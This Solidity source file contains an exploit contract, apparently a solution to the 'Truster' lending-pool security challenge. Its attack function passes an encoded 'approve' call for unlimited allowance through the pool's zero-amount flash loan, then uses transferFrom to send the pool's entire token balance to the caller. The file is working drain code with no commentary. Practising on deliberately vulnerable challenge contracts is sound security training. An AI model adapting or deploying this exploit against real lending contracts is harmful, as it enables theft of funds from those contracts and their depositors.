// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {TrusterLenderPool} from "../truster/TrusterLenderPool.sol";

contract ExploitContract {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    uint256 constant public MAX_INT_NUMBER = 2**256 - 1;

    constructor(address _token, address _pool)
    {
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
    }

    function attackContract() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this) , MAX_INT_NUMBER);
        pool.flashLoan(0, msg.sender, address(token),  data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }


}